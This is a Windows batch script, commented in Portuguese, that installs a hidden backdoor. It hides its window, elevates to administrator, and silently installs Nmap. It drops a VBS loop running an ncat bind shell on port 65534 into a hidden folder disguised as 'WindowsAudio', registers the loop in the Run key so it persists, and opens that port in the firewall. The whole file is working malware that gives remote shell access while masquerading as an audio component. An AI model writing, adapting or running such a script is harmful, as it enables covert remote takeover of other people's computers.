@echo off
:: Ocultar esta janela imediatamente
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

:: Verifica se já está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando privilegios de administrador...
    powershell start -verb runas '%0'
    exit /b
)

:: Instalar Nmap
echo [*] Instalando Nmap...
winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1

:: Atualizar PATH com o Nmap
set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"

:: Criar pasta oculta
mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1

:: Criar audio.vbs
echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
echo CreateObject("Wscript.Shell").Run "ncat -lnp 65534 -e cmd.exe", 0, True >> "%USERPROFILE%\WindowsAudio\audio.vbs"
echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"

:: Criar audio.bat
echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"

:: Registrar no Windows
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1

:: Liberar a porta 65534 na entrada
netsh advfirewall firewall add rule name="Abrir Porta Entrada 65534" dir=in action=allow protocol=TCP localport=65534

:: Iniciar listener
start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"

exit
